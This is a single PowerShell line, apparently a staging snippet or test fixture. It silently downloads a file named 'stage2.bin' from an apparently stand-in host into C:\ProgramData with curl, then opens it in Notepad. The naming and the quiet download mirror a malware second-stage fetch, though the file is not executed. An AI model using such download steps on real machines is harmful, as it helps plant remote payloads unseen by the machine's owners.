
$Stage1Url = 'https://internal.corp:8443/stage2.bin'; $DownloadPath = "C:\ProgramData\stage2.bin"; curl.exe -s -L -o $DownloadPath $Stage1Url; Start-Process -FilePath "notepad.exe" -ArgumentList $DownloadPath; $ProgressPreference = "SilentlyContinue"
